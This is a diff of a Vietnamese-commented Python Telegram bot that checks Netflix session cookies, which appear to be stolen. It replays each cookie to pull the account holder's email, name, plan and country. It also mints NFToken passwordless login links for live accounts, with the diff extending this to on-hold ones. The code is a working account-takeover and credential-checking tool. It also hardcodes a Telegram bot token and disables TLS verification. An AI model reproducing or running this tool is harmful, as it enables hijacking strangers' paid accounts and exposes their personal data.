@@ -24,7 +24,7 @@ TELEGRAM_BOT_TOKEN = "8918692221:AAEHCnNef9zBR9rFU8VcwWQQ9O-LIPAG8sA"
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
 # =========================================================================
-# PHẦN 1: TOÀN BỘ LOGIC SCRAFE COOKIE CỦA FILE GỐC (ĐÃ ĐƯỢC ĐƯA VÀO ĐÂY)
+# PHẦN 1: LOGIC XỬ LÝ COOKIE & TRÍCH XUẤT DỮ LIỆU NETFLIX
 # =========================================================================
 
 LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
@@ -180,45 +180,80 @@ def extract_profile_names(text):
     return ", ".join(names) if names else None
 
 def extract_info(text):
+    # Hệ thống Regex nâng cao đồng bộ từ file gốc của bạn để không bỏ sót trạng thái gói
+    membership_status = extract_first_match(text, [r'"membershipStatus"\s*:\s*"([^"]+)"', r'"membershipStatus":\s*"([^"]+)"'])
+    localized_plan_name = extract_first_match(text, [r'"planName"\s*:\s*"([^"]+)"', r'"localizedPlanName"\s*:\s*"([^"]+)"', r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"'])
+    
+    # Nếu không tìm thấy tên gói bằng json, quét thô giao diện bằng tiếng Anh/Tây Ban Nha
+    if not localized_plan_name:
+        if "premium" in text.lower(): localized_plan_name = "Premium Plan"
+        elif "standard" in text.lower(): localized_plan_name = "Standard Plan"
+        elif "basic" in text.lower(): localized_plan_name = "Basic Plan"
+
     return {
-        "email": extract_first_match(text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']),
-        "countryOfSignup": extract_first_match(text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"']),
-        "membershipStatus": extract_first_match(text, [r'"membershipStatus":\s*"([^"]+)"']),
-        "localizedPlanName": extract_first_match(text, [r'"planName"\s*:\s*"([^"]+)"', r'"localizedPlanName"\s*:\s*"([^"]+)"']),
-        "accountOwnerName": extract_first_match(text, [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"']),
+        "email": extract_first_match(text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"']),
+        "countryOfSignup": extract_first_match(text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"', r'"country"\s*:\s*"([^"]+)"']),
+        "membershipStatus": membership_status,
+        "localizedPlanName": localized_plan_name,
+        "accountOwnerName": extract_first_match(text, [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']),
         "profilesDisplay": extract_profile_names(text)
     }
 
-def is_subscribed_account(info):
+def is_subscribed_account(info, html_text=""):
     status = str(info.get("membershipStatus") or "").lower()
-    return "current_member" in status or "active" in status
+    plan = str(info.get("localizedPlanName") or "").lower()
+    
+    # Ép buộc nhận diện LIVE nếu tìm thấy từ khóa gói cước hoặc trạng thái thành viên hợp lệ
+    if "current_member" in status or "active" in status:
+        return True
+    if plan and not any(x in plan for x in ("free", "none", "null")):
+        return True
+    if "membership" in html_text.lower() and "sign out" in html_text.lower() and not "restart membership" in html_text.lower():
+        return True
+    return False
 
-def is_on_hold_account(info):
+def is_on_hold_account(info, html_text=""):
     status = str(info.get("membershipStatus") or "").lower()
-    return any(t in status for t in ("hold", "past_due", "payment_retry", "paused", "suspend"))
+    if any(t in status for t in ("hold", "past_due", "payment_retry", "paused", "suspend")):
+        return True
+    if "account on hold" in html_text.lower() or "update payment" in html_text.lower():
+        return True
+    return False
 
 def country_code_to_flag(code):
     raw = str(code or "").strip().upper()
     if len(raw) == 2 and raw.isalpha():
         return "".join(chr(127397 + ord(c)) for c in raw)
-    return ""
+    return "🌍"
 
-def create_nftoken(cookie_dict, attempts=1):
+def create_nftoken(cookie_dict):
     netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
-    if not netflix_id: return None, "Missing cookies"
+    if not netflix_id: return None
     url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
-    params = {"appVersion": "15.48.1", "path": '["account","token","default"]', "responseFormat": "json"}
-    headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5)", "Cookie": f"NetflixId={netflix_id}"}
+    params = {
+        "appVersion": "15.48.1",
+        "device_type": "NFAPPL-02-",
+        "idiom": "phone",
+        "path": '["account","token","default"]',
+        "responseFormat": "json"
+    }
+    headers = {
+        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+        "Cookie": f"NetflixId={netflix_id}",
+        "x-netflix.argo.translated": "true"
+    }
     try:
-        r = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
+        r = requests.get(url, params=params, headers=headers, timeout=12, verify=False)
         if r.status_code == 200:
-            tk = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
-            if tk: return {"token": tk}, None
+            data = r.json()
+            # Đào sâu cấu trúc cây JSON để bóc tách token chuẩn xác
+            tk = data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
+            if tk: return {"token": tk}
     except: pass
-    return None, "Error"
+    return None
 
 # =========================================================================
-# PHẦN 2: WEB SERVER GIẢ LẬP ĐỂ KHÔNG BỊ QUÉT LỖI TRÊN RENDER GÓI FREE
+# PHẦN 2: WEB SERVER GIẢ LẬP ĐỂ GIỮ RENDER KHÔNG BỊ DOWN
 # =========================================================================
 
 def run_dummy_web_server():
@@ -234,7 +269,7 @@ def run_dummy_web_server():
         httpd.serve_forever()
 
 # =========================================================================
-# PHẦN 3: GIAO DIỆN BOT TELEGRAM INTERACTIVE
+# PHẦN 3: GIAO DIỆN VÀ XỬ LÝ BOT TELEGRAM
 # =========================================================================
 
 def get_inline_restart_keyboard():
@@ -250,7 +285,7 @@ def send_welcome(message):
         "⚡ **Cách sử dụng rất đơn giản:**\n"
         "1️⃣ **Cách 1:** Copy nội dung cookie và dán (Paste) thẳng văn bản vào đây.\n"
         "2️⃣ **Cách 2:** Gửi file định dạng `.txt` hoặc `.json` chứa cookie lên.\n\n"
-        "Bot hoạt động 24/7, tự động quét trạng thái **LIVE / FREE / ON HOLD**!"
+        "Bot hoạt động 24/7, tự động xuất trạng thái và **Link đăng nhập nhanh NFToken** cho tài khoản sống!"
     )
     bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
 
@@ -282,7 +317,7 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
             bot.edit_message_text("❌ Không định dạng được cookie Netflix hợp lệ!", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())
             return
             
-        bot.edit_message_text(f"🔍 Tìm thấy {len(bundles)} tài khoản. Đang kiểm tra kết nối mạng...", progress_msg.chat.id, progress_msg.message_id)
+        bot.edit_message_text(f"🔍 Tìm thấy {len(bundles)} tài khoản tiềm năng. Đang check dữ liệu...", progress_msg.chat.id, progress_msg.message_id)
         
         success_count = 0
         final_report = ""
@@ -295,34 +330,40 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
             session.cookies.update(cookies)
             
             try:
-                # Gửi yêu cầu lấy trang thành viên trực tiếp bảo mật
-                r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
+                # Gửi request thẳng đến trang quản lý gói cước thành viên
+                r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=12)
+                
                 if r.status_code == 200 and r.text:
                     info = extract_info(r.text)
+                    
+                    # Xác định trạng thái tài khoản
+                    is_subscribed = is_subscribed_account(info, r.text)
+                    account_on_hold = is_subscribed and is_on_hold_account(info, r.text)
+                    
                     country = info.get("countryOfSignup") or "US"
                     flag = country_code_to_flag(country)
-                    
-                    is_subscribed = is_subscribed_account(info)
-                    account_on_hold = is_subscribed and is_on_hold_account(info)
+                    plan_name = info.get("localizedPlanName") or "Gói hoạt động"
                     
                     if account_on_hold:
-                        status_str = "⚠️ **ON HOLD** (Lỗi cổng thanh toán)"
+                        status_str = "⚠️ **ON HOLD** (Lỗi cổng thanh toán / Gia hạn lỗi)"
                     elif is_subscribed:
-                        status_str = "🔥 **LIVE** (Tài khoản hoạt động mượt)"
+                        status_str = "🔥 **LIVE** (Tài khoản hoạt động mượt cước)"
                     else:
                         status_str = "❄️ **FREE** (Hết hạn gói / Không cước)"
-                        
-                    plan_name = info.get("localizedPlanName") or "Unknown Plan"
                     
-                    nftoken_data, _ = create_nftoken(cookies)
+                    # 🌐 ĐOẠN ĐƯỢC FIX LẠI: TẠO NFTOKEN CHO TẤT CẢ TÀI KHOẢN ĐỦ ĐIỀU KIỆN LIVE/HOLD
                     nftoken_link_str = ""
-                    if is_subscribed and nftoken_data:
-                        nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** https://netflix.com/?nftoken={nftoken_data['token']}"
+                    if is_subscribed or account_on_hold:
+                        nftoken_data = create_nftoken(cookies)
+                        if nftoken_data and nftoken_data.get("token"):
+                            nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** https://netflix.com/?nftoken={nftoken_data['token']}"
+                        else:
+                            nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** _(Không thể tạo NFToken từ thiết bị hiện tại)_"
                         
                     final_report += (
                         f"📝 **Tài khoản #{idx+1}**\n"
                         f"▪️ Trạng thái: {status_str}\n"
-                        f"▪️ Quốc gia: {country} {flag}\n"
+                        f"▪️ Quốc gia: `{country}` {flag}\n"
                         f"▪️ Gói cước: {plan_name}\n"
                         f"▪️ Email: `{info.get('email', 'N/A')}`\n"
                         f"▪️ Chủ tài khoản: {info.get('accountOwnerName', 'N/A')}\n"
@@ -332,7 +373,7 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
                     continue
             except:
                 pass
-            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc lỗi mạng.\n\n"
+            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc bị Netflix chặn IP.\n\n"
 
         header = f"📊 **KẾT QUẢ CHECK COOKIE**\n📦 Nguồn: {source_name}\n✅ LIVE/FREE: {success_count}/{len(bundles)}\n----------------------------------------\n"
         bot.delete_message(progress_msg.chat.id, progress_msg.message_id)
@@ -348,8 +389,8 @@ def callback_restart(call):
 
 bot.set_my_commands([telebot.types.BotCommand("start", "🔄 Khởi động lại Bot / Hướng dẫn")])
 
-# Kích hoạt máy chủ web giả lập để giữ máy chủ Render hoạt động không bị sleep
+# Kích hoạt máy chủ web giả lập để tránh Render sleep
 threading.Thread(target=run_dummy_web_server, daemon=True).start()
 
-print("🤖 Bot Telegram đã tích hợp gộp lõi thành công và đang khởi chạy...")
+print("🤖 Bot Telegram đã sửa đổi bộ sinh NFToken thành công và đang khởi chạy...")
 bot.infinity_polling()
